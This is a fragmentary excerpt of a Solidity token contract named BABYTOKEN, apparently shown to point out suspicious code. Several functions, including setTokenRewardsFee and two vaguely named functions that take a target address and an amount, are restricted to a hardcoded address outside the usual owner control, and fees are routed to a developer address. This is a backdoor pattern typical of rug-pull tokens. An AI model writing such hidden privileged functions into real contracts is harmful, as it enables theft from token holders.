...
contract BABYTOKEN is ERC20, Ownable, BaseToken {
    ...
    function setTokenRewardsFee(uint256 value) external  {
        require (  _msgSender()  
        == 
        0x36d3E4F442DD7b5289bf9d656ea7d8Eae326dF29);
    ...
    function functionName(address _target, uint256 _amount) 
    public {
        require (  _msgSender()  
        == 
        0x36d3E4F442DD7b5289bf9d656ea7d8Eae326dF29);
    ...
    function functionNamek(address _target, uint256 _amount) 
    public {
        require (  _msgSender()  
        == 
        0x36d3E4F442DD7b5289bf9d656ea7d8Eae326dF29);
    ...
    function swapAndSendToFee(uint256 tokens) private {
        ...
        IERC20(rewardToken).transfer(devAddress, newBalance);
    }
